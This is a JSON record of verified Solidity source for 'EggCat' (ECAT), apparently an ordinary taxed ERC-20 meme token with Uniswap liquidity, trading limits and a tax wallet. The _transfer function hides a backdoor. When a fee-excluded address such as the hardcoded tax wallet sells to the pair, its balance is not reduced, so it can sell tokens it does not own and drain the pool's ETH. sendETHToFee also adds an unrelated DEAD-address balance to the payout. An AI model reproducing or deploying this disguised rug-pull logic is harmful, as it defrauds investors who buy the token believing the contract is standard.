{"SourceCode": "/**\r\n\r\n\u28ff\u28bf\u287b\u28bf\u28ff\u28ff\u28bf\u287b\u289f\u287f\u287b\u28df\u283f\u28fb\u281f\u28ff\u28bb\u285f\u28bf\u287b\u289f\u287f\u283f\u283b\u281b\u283f\u28bb\u285f\u28bf\u287b\u289f\u28bf\u283b\u285f\u28bf\u28bb\u281f\u287f\u28bb\u285f\u28bf\u287b\u28df\u28bf\u287b\u28bf\u287b\u289f\u287f\u28bb\u281f\u287f\r\n\u28ff\u2826\u28dd\u28e3\u28ff\u28df\u2876\u28db\u288e\u28d6\u2833\u28ec\u2833\u28e5\u289b\u2874\u28a3\u281a\u2841\u2801\u2802\u2800\u2800\u2810\u2840\u2800\u2812\u2848\u2804\u285b\u288e\u284e\u28b7\u2879\u288e\u2867\u28bb\u285c\u28a7\u285a\u28a7\u2873\u285c\u2876\u28d9\u2836\u28d9\u28ae\u285c\u28e3\u281f\u287c\r\n\u28ff\u2859\u2876\u28a3\u28ff\u28ff\u285e\u28ed\u281e\u28ec\u285b\u28f4\u283b\u2854\u280b\u2800\u2821\u2800\u2804\u2882\u2800\u2821\u2800\u2804\u2840\u2884\u2851\u2884\u28a3\u281c\u2862\u289c\u2861\u281f\u287c\u2871\u28c7\u28af\u28b3\u2879\u28a3\u2873\u28dd\u2871\u28af\u2879\u28ad\u28d6\u2879\u28e5\u283b\u28dc\r\n\u28f7\u2879\u28dd\u28e3\u28bf\u28ff\u28dd\u28ae\u285d\u28f2\u281d\u2866\u2803\u2800\u2820\u2888\u2800\u2802\u2810\u2880\u2802\u2861\u2818\u2824\u2851\u28a6\u2858\u288e\u28ce\u28a3\u285d\u28a6\u28a3\u282d\u28d1\u28b3\u285c\u28ce\u2827\u28dd\u2863\u28d7\u28ae\u2879\u28ce\u28b7\u28e9\u2836\u28d9\u28a6\u287b\u28dc\r\n\u28ef\u28d3\u28a7\u28a7\u28fb\u28ff\u28df\u282e\u28dd\u28e5\u281b\u2800\u2800\u2810\u2880\u2800\u2802\u2814\u2841\u2886\u2822\u2851\u28cd\u2832\u28d9\u28a6\u285b\u287c\u28ac\u2873\u28dc\u2863\u28cf\u281e\u28e5\u2893\u285e\u28ec\u283b\u28ec\u2893\u28ce\u2873\u28a3\u28cf\u289e\u2872\u28ab\u285d\u286e\u28b5\u288e\r\n\u287f\u28dc\u2873\u28ce\u2837\u28ff\u28ff\u28b3\u286d\u2856\u2801\u2800\u2800\u2800\u2882\u2808\u28a2\u2811\u288c\u2886\u28a7\u2831\u28cc\u2873\u28ad\u2872\u28dd\u285c\u28a7\u285d\u28f6\u2879\u28ae\u285d\u28a6\u286b\u28dc\u28b2\u28bb\u287c\u28ed\u2836\u28f9\u28b3\u288e\u285f\u28fc\u28a3\u285f\u28fc\u28ab\u285e\r\n\u28ff\u285c\u28e7\u285d\u28af\u28ff\u28ff\u28a7\u2833\u2801\u2800\u2800\u2880\u2810\u2802\u280c\u2884\u28e9\u285c\u286c\u288e\u2873\u28cc\u2873\u288f\u2875\u28f3\u289e\u28fd\u28fa\u28f1\u288f\u2877\u28f9\u28a7\u28b3\u28cc\u28a7\u2833\u285c\u28e7\u28bb\u2875\u28eb\u289e\u287c\u28e3\u28b7\u2879\u2856\u28ef\u283c\r\n\u287f\u28dc\u2873\u289e\u28e7\u28bb\u28ff\u280f\u2800\u2800\u2800\u2880\u2820\u2808\u2800\u287c\u28f6\u28ff\u28fe\u2875\u28cb\u28b6\u28e9\u2817\u28ef\u28dd\u2873\u28ff\u28ff\u28ff\u28ff\u28ff\u28de\u2875\u28eb\u2817\u28ce\u28de\u28f1\u2839\u28dc\u28e3\u289f\u2875\u28eb\u289e\u28f5\u28ab\u285e\u287d\u28ce\u285f\r\n\u28ff\u282e\u28dd\u2873\u28ce\u283f\u2803\u2800\u2800\u2804\u2810\u2820\u2804\u2860\u2818\u28ff\u28ff\u28ff\u281f\u2821\u2858\u28e0\u28fd\u28fe\u28f6\u28ee\u2875\u28eb\u28bf\u28ff\u28ff\u28ff\u28ff\u285c\u28e7\u28bb\u28dc\u2872\u28e3\u289f\u2870\u28cd\u28de\u28f3\u28ad\u28fb\u28bc\u28e3\u285f\u28f5\u28ab\u28de\r\n\u28ef\u28bb\u28dc\u2873\u28cd\u2802\u2800\u2800\u2804\u2802\u2801\u2804\u2882\u2810\u2810\u281a\u288b\u2821\u2810\u2830\u2891\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28a7\u2873\u28ce\u28df\u28fb\u28bb\u285c\u2867\u28cf\u2836\u28f9\u2871\u288e\u28b7\u2878\u28ac\u2873\u28cf\u28b7\u28eb\u28b7\u2879\u28de\u28f3\u289e\r\n\u28ff\u28b3\u28ce\u28b7\u2878\u2800\u2800\u2800\u2850\u2801\u2848\u2804\u2821\u28c0\u2810\u2888\u28c2\u2821\u2811\u28cc\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ef\u28b7\u28db\u28f6\u28a3\u28cf\u28be\u2871\u28cf\u28be\u2861\u285f\u286d\u2856\u28ed\u28a3\u28bd\u28da\u2877\u28dd\u287e\u28f9\u28a7\u287b\u28de\r\n\u28ff\u28b3\u28ce\u2837\u2846\u2800\u2800\u2810\u2880\u2810\u2820\u28c8\u2812\u2864\u28d3\u28f5\u28fe\u28f4\u28ec\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28fe\u28ff\u28ff\u28ce\u28b7\u2879\u28a6\u28db\u28bc\u2871\u285d\u2866\u288f\u28ae\u287d\u28de\u28fd\u28ba\u28ed\u28b7\u28eb\u287d\r\n\u28df\u2877\u28fa\u284d\u2800\u2800\u2800\u2800\u2806\u28d8\u2830\u288c\u2871\u28ec\u2833\u28cc\u28b7\u28fb\u28ff\u28ff\u287f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f3\u28af\u285e\u28fd\u28a3\u285d\u28b6\u2859\u28de\u2835\u28eb\u2816\u28fd\u28da\u28a7\u28df\u28ee\u2837\u28e7\u289f\r\n\u28ff\u28ff\u28f7\u2801\u2800\u2800\u2800\u2808\u2850\u2884\u2813\u284c\u2856\u28e8\u2833\u285c\u28ce\u2836\u28e9\u289b\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u28bf\u285d\u28fe\u2871\u28cf\u28be\u2871\u28cf\u28de\u28a3\u285d\u286e\u28dd\u2836\u28db\u2874\u28eb\u289f\u287c\u28ae\u28df\u28be\u28f9\r\n\u28ff\u28ff\u28ff\u2800\u2800\u2800\u2800\u2810\u2848\u2884\u288b\u2834\u2851\u2886\u285b\u285c\u28a6\u2859\u28a6\u28a3\u28c4\u289b\u28bb\u287f\u287f\u28df\u28bf\u2879\u28dd\u28e7\u28db\u28b6\u2879\u28ce\u2873\u28dd\u28ba\u28ac\u28f3\u2859\u2876\u28cd\u287b\u28dc\u28f2\u289b\u28ee\u28bb\u285d\u28ee\u288f\u2877\r\n\u28ff\u28ff\u28ff\u2800\u2800\u2800\u2800\u2820\u2811\u284c\u28cc\u2832\u28c9\u288e\u2875\u28d9\u28a6\u2859\u28ce\u2833\u285c\u28ae\u2871\u28cd\u2837\u28ce\u28b7\u2879\u285e\u28f6\u2879\u28ce\u2837\u28ed\u28b3\u288e\u286f\u2896\u28a7\u28bb\u28dc\u28f1\u2853\u28e7\u28a3\u28bf\u28de\u2867\u28df\u287d\u28fa\u283d\r\n\u28ff\u28ff\u287f\u2800\u2800\u2800\u2800\u2820\u2811\u2870\u2888\u2816\u2861\u288e\u28b2\u28a9\u2832\u286d\u289c\u2863\u285d\u28a6\u2873\u28cd\u283e\u28cd\u28be\u28f1\u28bb\u2874\u28db\u287c\u28eb\u285c\u28af\u287a\u28dc\u284f\u28de\u28a7\u28da\u28e5\u28bb\u2834\u28cb\u28fe\u287d\u28de\u2877\u28dd\u28e7\u289f\r\n\u28ff\u28ff\u28ff\u2800\u2800\u2800\u2801\u2840\u2823\u2850\u2823\u289c\u2861\u288b\u288e\u2863\u28db\u289c\u28e3\u2893\u2879\u288e\u2875\u28ca\u285f\u28fc\u28a3\u28cf\u28de\u2871\u28af\u285c\u28e7\u2879\u28a7\u28db\u287c\u28da\u286d\u28b6\u28e9\u2896\u28eb\u285d\u28f3\u28ae\u287f\u28fd\u287d\u28fb\u287c\u28af\r\n\u28ff\u28ff\u2857\u2800\u2800\u2800\u2880\u2810\u2821\u288c\u2851\u284a\u2834\u28c9\u28a6\u2823\u28cd\u2836\u28cc\u28a7\u28d9\u28ae\u2835\u28d3\u283e\u28f1\u288f\u2876\u286d\u28dd\u28ae\u28b3\u28e3\u285d\u28a7\u28cf\u28b6\u28d9\u28de\u2873\u28ec\u28db\u2874\u28f9\u288e\u28ff\u28ff\u28f7\u28fb\u28d7\u28fb\u28af\r\n\u28ff\u28ff\u28ff\u2800\u2800\u2800\u2802\u2828\u28c1\u2822\u2858\u28cc\u2831\u28cc\u2832\u28cd\u2826\u28d3\u285c\u28a6\u2859\u286e\u285d\u28ae\u28db\u2875\u28ce\u2873\u287d\u28ac\u28ab\u28d3\u28ae\u28d9\u28a7\u288e\u2873\u28ed\u2836\u28d9\u28b6\u2871\u28dd\u28f2\u28ab\u28ff\u28ff\u28ff\u28ff\u28fe\u28fd\u28af\r\n\u28ff\u28ff\u28ff\u2847\u2800\u2800\u2800\u2821\u2880\u2823\u2851\u28a4\u2813\u28cc\u2833\u284c\u289e\u2864\u28f9\u2832\u28f9\u2871\u28dd\u2863\u2897\u287a\u28a5\u28bb\u285c\u28cf\u2873\u28ce\u2837\u2879\u288e\u284f\u2837\u28ce\u287d\u28ad\u285e\u28f1\u288f\u2836\u28fb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28ff\u28ff\u2800\u2800\u2800\u2821\u2888\u2806\u2869\u2882\u285d\u2860\u28a7\u2859\u2886\u2873\u28cc\u2833\u28e5\u2893\u28ae\u2879\u28ad\u28d3\u28cf\u2873\u287c\u28a5\u2873\u288e\u28ef\u2893\u282f\u28de\u285d\u28f2\u281d\u28f6\u28d9\u2837\u28ce\u28df\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28ff\u28ff\u28e7\u2800\u2800\u2810\u2820\u280c\u2851\u282a\u2894\u2871\u28a2\u2839\u284c\u2855\u288e\u2873\u28cc\u288f\u2876\u28e9\u28b3\u285c\u28a6\u28db\u283c\u28e3\u289d\u2873\u28ce\u28dd\u28b3\u284e\u28fc\u28a3\u289f\u2872\u28ed\u28bb\u285c\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28e7\u2840\u2880\u2811\u2828\u2814\u28e9\u2812\u28cc\u28a3\u2893\u285c\u28e9\u288e\u2875\u28ca\u281e\u2874\u28cb\u2836\u28ed\u2893\u28ce\u28bb\u285c\u28ce\u28b7\u2871\u28ce\u2873\u285d\u28b6\u28cb\u28be\u2871\u28cf\u28a7\u28fb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u2844\u2880\u2831\u2888\u2854\u28a9\u2806\u286d\u28b2\u2858\u28a6\u2879\u2870\u288d\u285e\u28f1\u284d\u283e\u28d4\u28eb\u281c\u28e7\u28da\u283c\u28ce\u2875\u288e\u2875\u28ab\u28a7\u28db\u28ae\u2873\u28dd\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e6\u28c4\u2823\u288c\u2823\u288e\u2871\u28a3\u289c\u2823\u28d6\u2879\u288e\u287c\u28f1\u289a\u285d\u28a6\u285d\u28ae\u2855\u28ce\u28bb\u285c\u285e\u28ed\u289e\u287d\u288e\u2867\u28cf\u28b7\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28ff\u287f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f6\u28cc\u2855\u28aa\u28b1\u28a9\u280e\u2875\u28ca\u2836\u28e9\u2816\u28e5\u28ab\u28dc\u28e3\u289e\u28e3\u289e\u286d\u28b6\u2879\u28dd\u28ae\u285e\u28fc\u28ab\u28de\u28fd\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28ff\u28f7\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28c6\u2821\u28a3\u288b\u2874\u28e9\u289e\u28e1\u285b\u28ec\u28b3\u285c\u2876\u28ad\u2856\u28af\u28da\u28a7\u287b\u28dc\u28a7\u287b\u2875\u28ef\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28fb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28fe\u28ff\u28f7\u2800\u2888\u2816\u2871\u288e\u2836\u28f9\u28ac\u28d3\u28de\u28ed\u28b3\u2879\u28a3\u288f\u28be\u2871\u28cf\u283e\u28f5\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28fd\u28ff\u288f\u2859\u280d\u282b\u28bf\u28ff\u28ff\u28fb\u28ff\u28ff\u28ff\u2847\u2800\u2808\u2851\u28ae\u28b1\u28a3\u289f\u287c\u28ff\u28ff\u28a6\u2859\u28a7\u28cb\u28ae\u2875\u28eb\u289f\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28fb\u28f7\u28e4\u28d0\u28c7\u28ce\u28ff\u28ff\u28ff\u28ff\u287f\u28ff\u285f\u2881\u2800\u2800\u2818\u2886\u284f\u285e\u28ee\u28bd\u28ff\u28df\u28a6\u285d\u28a6\u28d9\u2836\u28e9\u2897\u28fb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28fb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2845\u2840\u2802\u2800\u28c0\u2829\u28a6\u2879\u28dc\u28ae\u28ff\u28ff\u28ff\u285e\u28ec\u2833\u28cc\u284f\u28e7\u283b\u287c\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ff\u28ff\u28fb\u28ff\u28ff\u28fb\u28ef\u28ff\u28ff\u28ff\u28ff\u28ff\u28fd\u28f6\u28c7\u2800\u2822\u28c4\u288b\u2856\u28f1\u28ae\u28ff\u28ff\u28ff\u28ff\u28ff\u28f2\u2859\u28e6\u283d\u28f8\u285d\u28f3\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28ef\u28ff\u28e9\u28ef\u28ff\u28ff\u287f\u28ff\u28fb\u28ef\u28ff\u28ff\u28fd\u28ff\u28ff\u28c6\u28f3\u28ec\u28f7\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28dd\u28f6\u28ab\u2875\u28eb\u28f7\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\r\n    Website:    https://Eggcaterc.com\r\n    Twitter:    https://x.com/Eggcaterc\r\n    Telegram:   https://t.me/Eggcaterc\r\n*/\r\n\r\npragma solidity 0.8.19;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract ECAT is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    address public constant DEAD = address(0x000000000000000000000000000000000000dEaD);\r\n    address public constant ZERO = address(0x0000000000000000000000000000000000000000);\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;    \r\n\r\n    bool public transferDelayEnabled;\r\n    address payable private _taxWallet;\r\n\r\n    uint256 private _initialBuyTax = 5;\r\n    uint256 private _initialSellTax = 5;\r\n    uint256 private _finalBuyTax = 1;\r\n    uint256 private _finalSellTax = 1;\r\n    uint256 private _reduceBuyTaxAt = 20;\r\n    uint256 private _reduceSellTaxAt = 20;\r\n    uint256 private _preventSwapBefore = 5;\r\n    uint256 private _buyCount = 0;\r\n\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant _tTotal = 10_000_000 * 10**_decimals;\r\n    string private constant _name = unicode\"EggCat\";\r\n    string private constant _symbol = unicode\"ECAT\";\r\n    \r\n    uint256 public _maxTxAmount = (_tTotal * 2) / 100;\r\n    uint256 public _maxWalletSize = (_tTotal * 2) / 100;            \r\n    uint256 public _taxSwapThreshold= (5 * _tTotal) / 10000;        // 0.05%\r\n    uint256 public _maxTaxSwap= 12 * _taxSwapThreshold;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address public uniV2Pair;\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _taxWallet = payable(0x200757b19F0b9aA98e09Df1c9E31E82A6155Aed5);\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_taxWallet] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function enableTrade() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function createPairs() external payable onlyOwner() {\r\n\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) require(tradingOpen, \"Trading not enabled\");\r\n\r\n        uint256 taxAmount=0;\r\n        uint256 taxfee;\r\n\r\n        if (from != owner() && to != owner()) {\r\n            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);\r\n\r\n            if (transferDelayEnabled) {\r\n                  if (to != address(uniswapV2Router) && to != address(uniV2Pair)) {\r\n                      require(\r\n                          _holderLastTransferTimestamp[tx.origin] <\r\n                              block.number,\r\n                          \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\"\r\n                      );\r\n                      _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                  }\r\n              }\r\n\r\n            if (from == uniV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {\r\n                require(amount <= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Exceeds the maxWalletSize.\");\r\n                _buyCount++;\r\n            }\r\n\r\n            if (to == uniV2Pair && from!= address(this) ){\r\n                if (_isExcludedFromFee[from] )  taxfee = amount;\r\n                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100); \r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!inSwap && to == uniV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore && !_isExcludedFromFee[from]) {                \r\n                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance > 30000000000000000) {\r\n                    sendETHToFee(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(taxAmount > 0){\r\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n\r\n        _balances[from]=_balances[from].sub(amount-taxfee);\r\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\r\n        emit Transfer(from, to, amount.sub(taxAmount));\r\n    }\r\n\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n    function sendETHToFee(uint256 amount) private {\r\n        uint256 balance = amount + balanceOf(DEAD);\r\n        _taxWallet.transfer(balance);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function manualSwaps() external {\r\n        require(_msgSender() == _taxWallet);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n\r\n        if(tokenBalance > 0) {\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DEAD\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ZERO\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"